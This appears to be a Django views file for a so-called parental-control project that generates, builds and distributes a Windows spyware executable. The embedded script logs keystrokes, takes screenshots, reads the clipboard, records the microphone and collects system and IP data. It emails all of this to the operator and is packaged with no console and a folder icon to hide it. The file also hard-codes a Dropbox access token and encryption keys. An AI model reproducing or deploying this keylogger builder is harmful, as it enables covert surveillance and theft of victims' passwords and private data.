from django.shortcuts import render,HttpResponse
import os
import time
import dropbox
d1={'flag':0,'file':'D:\\mini_pro\\mini_pro\\dist\\parental_temporary.exe','file1':'D:\\mini_pro\\mini_pro\\dist\\parental_temporary.exe'}

def home(request):
    return render(request,'home.html',d1)
def generate(request): #To generate a link for exe file that sends mails to given email Id
    email_add=request.POST['email']
    pwd=request.POST['password']
    make_py_file(email_add,pwd)
    make_exe_file()
    time.sleep(40)
    dropbox_access_token= "qgnXs05E7gQAAAAAAAAAAeGcAMyvc1-yTnaUoDmlwSD5J0sHgKeqOZeLcCXB3m97"    #Enter your own access token
    dropbox_path= "/ParentalControl/"+email_add+".exe"
    computer_path="D:\\mini_pro\\mini_pro\\dist\\parent_temporary.exe"
    client = dropbox.Dropbox(dropbox_access_token)
    client.files_upload(open(computer_path, "rb").read(), dropbox_path)
    result=client.files_get_temporary_link('/ParentalControl/'+email_add+'.exe')
    res=client.files_get_temporary_link('/ParentalControl/DecryptFile.exe')
    return render(request,'home.html',{'flag':1,'file':result.link,'file1':res.link,'email_val':email_add})

def delete_from_dropbox(request):
    #time.sleep(120)
    dropbox_access_token= "qgnXs05E7gQAAAAAAAAAAeGcAMyvc1-yTnaUoDmlwSD5J0sHgKeqOZeLcCXB3m97"    #Enter your own access token
    email_add=request.POST['email1']
    print("hiiiiiiiiiiiii",email_add)
    dbx=dropbox.Dropbox(dropbox_access_token)
    dropbox_path= "/ParentalControl/"+email_add+".exe"
    dbx.files_delete_v2(dropbox_path)
    return render(request,'home.html',d1)
def make_exe_file():
    os.system("start cmd /c pyinstaller --onefile --noconsole --icon=folder.ico parent_temporary.py")
def make_py_file(email,pwd):
    str1="""
from Cryptodome.Util.Padding import pad
from threading import *
from Cryptodome.Cipher import AES
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import requests
import smtplib
import socket
import datetime
import platform
from ssl import ALERT_DESCRIPTION_ILLEGAL_PARAMETER
import win32clipboard
import io
from pynput.keyboard import Listener
from io import BytesIO
import time
import os
import urllib.request
import sounddevice as sd
import numpy as np
from cryptography.fernet import Fernet
from PIL import ImageGrab
import winshell

keystroke_data_file = "system_data.txt"
system_data_file = "do_not_delete.txt"
clipboard_data_file="required.txt"
file_path=winshell.application_data(1)
continuation="\\\\"
count=0
keys=""
email_address="""+"\""+email+"\""
    str1 = str1 +"""\npassword="""+"\""+pwd+"\""
    str1=str1+"""\nreceiver_address="""+"\""+email+"\""
    str1=str1+"""\naudio_data_file = "functionality.txt"
screenshot_data_file = "important.txt"
microphone_time = 10

total_count_end = 3
total_count = 0
f1=f2=f3=f4=f5=0
file_merge = file_path + continuation
key1="ROQ8SD9Z-5gFtmlbDQm_21i723rNVKi3ccN4tALPQgU="
fernet = Fernet(key1)
def stob_and_encrypt(s):
    pasted_data=bytes(s,'utf-8')
    encrypted = fernet.encrypt(pasted_data)
    return encrypted
def send_email(keystroke_data_file,screenshot_data_file,clipboard_data_file,system_data_file,audio_data_file,file_path,toaddr):

    sender_address=email_address
    msg=MIMEMultipart()
    msg['From']=sender_address
    msg['To']=receiver_address
    msg['subject']='Log file'
    body='Recorded activity at ' + str(datetime.datetime.now())
    msg.attach(MIMEText(body,'plain'))

    attachment=open(file_path+keystroke_data_file,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read()) 
    #sampatg hjjkjjhhhggggfffddsaaasdfffcvv
    encoders.encode_base64(p)
    p.add_header("Content-Disposition","attachment ; filename = %s"%(keystroke_data_file))
    msg.attach(p)

    attachment=open(file_path+screenshot_data_file,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition","attachment ; filename = %s"%(screenshot_data_file))
    msg.attach(p)

    attachment=open(file_path+clipboard_data_file,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition","attachment ; filename = %s"%(clipboard_data_file))
    msg.attach(p)

    attachment=open(file_path+system_data_file,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition","attachment ; filename = %s"%(system_data_file))
    msg.attach(p)

    attachment=open(file_path+audio_data_file,'rb')
    p=MIMEBase('application','octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header("Content-Disposition","attachment ; filename = %s"%(audio_data_file))
    msg.attach(p)

    s=smtplib.SMTP('smtp.gmail.com',587)
    s.starttls()
    s.login(sender_address,password)
    text=msg.as_string()
    s.sendmail(sender_address,toaddr,text)
    s.quit()
def computer_information():
    with open(file_path+continuation+system_data_file,'wb') as f:
        hostname=socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        encrypted=""
        try:
            public_ip=urllib.request.urlopen("https://ident.me").read().decode("utf-8")
            #public_ip_2=get("https://api.ipify.org").text
            encrypted = public_ip+"\\n"

            #f.write("public ip address : "+public_ip_2)
        except Exception:
            try:
                
                public_ip=requests.get('https://api.ipify.org').text
                encrypted = public_ip+'\n'
            except Exception:
                try:
                    ip = requests.get('https://checkip.amazonaws.com').text.strip()
                    encrypted = ip+'\n'
                except Exception:
                    try:
                        f = requests.request('GET', 'http://myip.dnsomatic.com')
                        ip = f.text
                        encrypted=ip+'\n'
                    except Exception:
                        try:
                            myip = requests.get('https://www.wikipedia.org').headers['X-Client-IP']
                            encrypted=myip+'\n'
                        except Exception:
                            try:
                                import upnpclient
                                devices = upnpclient.discover()
                                if(len(devices) > 0):
                                    externalIP = devices[0].WANIPConn1.GetExternalIPAddress()['NewExternalIPAddress']
                                encrypted=externalIP+'\n'
                            except Exception:
                                error_msg=r'Couldn\'t get the public ip '
                                encrypted = error_msg+'\n'

        str1=encrypted+"processor : "+platform.processor()+"\\nSystem: "+platform.system()+"  "+platform.version()+"\\nMachine : "+platform.machine()+"\\nHostname : "+hostname+"\\nPrivate IP Address : "+str(IPAddr)+"\\n"
        encrypted = stob_and_encrypt(str1)
        #print(fernet.decrypt(encrypted))sampath kumar angara visakhapatnam andhra pradesh india usa pakistan britain canada australia new zealanad south africa

        #print() sampath kumar angara
        #visakhapatnam andhra pradesh india 
        f.write(encrypted)
def copy_clipboard():
    with open(file_path + continuation + clipboard_data_file, "wb") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            encrypted = stob_and_encrypt(pasted_data)

            f.write(encrypted)

        except:
            try:
                import pyperclip
                s = pyperclip.paste()
                encrypted = stob_and_encrypt(s)
                f.write(encrypted)
            except:
                f.write(stob_and_encrypt("Clipboard could be not be copied"))
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    #encrypted=fernet.encrypt(bytes(myrecording))
    np_bytes=BytesIO()
    np.save(np_bytes,myrecording,allow_pickle=True)
    np_bytes=np_bytes.getvalue()
    encrypted = fernet.encrypt(np_bytes)
    with open(file_path+continuation+audio_data_file,'wb') as f:
        f.write(encrypted)
#sampath kumar angara visakhapatnam andhra pradesh india 
#sampath kumar angara visakhapatnam andhra pradesh sampath kumar angara sampuytrewwqadfh
#visakhapatnam andhra pradesh 530018 India Asia Earth Universe galaxy star planetsampath kumar angara India@2019 saggh

def screenshot():
    
    im = ImageGrab.grab()
    buf = io.BytesIO()
    im.save(buf, format='PNG')
    byte_im = buf.getvalue()
    cipher=AES.new(aes_key,AES.MODE_CBC,iv_key)
    ciphertext=cipher.encrypt(pad(byte_im,16))

    with open(file_path+continuation+screenshot_data_file,'wb') as f:
        f.write(ciphertext)
def on_press(key):
        global keys,count,currentTime
        #print(key)
        keys=keys+str(key)
        #count+=1
        currentTime = time.time()

def write_file(keys):
        with open(file_path+continuation+keystroke_data_file,'ab') as f:
            
                encrypted = stob_and_encrypt(keys)
                f.write(encrypted)


listener=Listener(on_press=on_press)  
class keyboard_logger(Thread):
    def run(self):
        
        listener.start()

delete_files = [system_data_file, clipboard_data_file, keystroke_data_file, screenshot_data_file, audio_data_file]
    
class remaining_logger(Thread):
    def run(self):
        
        global total_count , total_count_end,keys
        while(total_count<total_count_end):
            #sampath kumar angara visakhapatnam india a
            try:
                screenshot()
            except:
                f1=1
            #a=[]
            #send_email(screenshot_data_file, file_path + continuation + screenshot_data_file, receiver_address)
            #a.append(screenshot_data_file)
            
            try:
                copy_clipboard()
            except:
                f2=1
            #a.append(clipboard_data_file)
            #send_email(clipboard_data_file, file_path + continuation + clipboard_data_file, receiver_address)

            
            try:
                computer_information()
            except:
                f3=1
            #a.append(system_data_file)
            #send_email(system_data_file, file_path + continuation + system_data_file, receiver_address)

            
            try:
                microphone()
            except:
                f4=1
            #a.append(audio_data_file)
            #send_email(audio_data_file, file_path + continuation + audio_data_file, receiver_address)
            #send_email()
            write_file(keys)
            keys=""
            #a.append(keystroke_data_file)
            send_email(keystroke_data_file,screenshot_data_file,clipboard_data_file,system_data_file,audio_data_file,file_path+continuation,receiver_address)
            
            for file in delete_files:
                os.remove(file_merge + file)
            #total_count += 1
            if(total_count==total_count_end):
                listener.stop()


t1=keyboard_logger()
t2=remaining_logger()
t1.start()
t2.start()
t1.join()
t2.join()
    """
    o=bytes(str1,'utf-8')
    o=bytes("aes_key=",'utf-8')+bytes("b'",'utf-8')+bytes("\\"+"x"+"9"+"d"+"\\"+"x"+"9"+"8"+"\\"+"x"+"0"+"5"+"\\"+"x"+"c"+"3"+"\\"+"x"+"9"+"5"+"\\"+"x"+"f"+"6"+"\\"+"x"+"d"+"5"+"^"+"P"+"\\"+"x"+"b"+"2"+"\\"+"x"+"8"+"a"+"\\"+"x"+"d"+"1"+"\\"+"x"+"0"+"c"+"\\"+"x"+"e"+"0"+"c"+"\\"+"x"+"9"+"0'",'utf-8')+bytes("\n",'utf-8')+o
    o=bytes("iv_key=",'utf-8')+bytes("b'",'utf-8')+bytes("B"+"\\"+"x"+"d"+"2"+"\\"+"x"+"e"+"9"+"n"+"\\"+"x"+"c"+"b"+"\\"+"x"+"1"+"e"+"\\"+"x"+"0"+"c"+"S"+"\\"+"x"+"b"+"1;"+"\\"+"x"+"a2"+"\\"+"x"+"e5"+"\\"+"x"+"d5"+"\\"+"xd"+"f"+"\\"+"x"+"08"+"\\"+"x"+"db'",'utf-8')+bytes("\n",'utf-8')+o
    file = open("D:\\mini_pro\\mini_pro\\parent_temporary.py", 'wb')
    file.write(o)
    file.close()
    #print(open("D:\\mini_pro\\mini_pro\\parent_temporary.py", 'rb').read())
    